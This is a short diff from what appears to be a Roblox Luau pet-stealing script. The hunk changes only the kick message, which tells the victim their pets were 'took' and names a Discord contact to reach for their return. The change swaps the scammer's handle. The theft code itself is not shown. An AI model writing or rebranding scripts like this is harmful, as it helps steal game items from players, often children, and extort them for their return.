@@ -314,5 +314,5 @@ if TargetUserId then
         task.wait(1)
     end
     
-    game:GetService("Players").LocalPlayer:Kick("Your pets have been took by K4F7!\nContact 'k4f7.luau' on discord for them back.")
+    game:GetService("Players").LocalPlayer:Kick("Your pets have been took by gstvrck!\nContact 'gstvrck' on discord for them back.")
 end
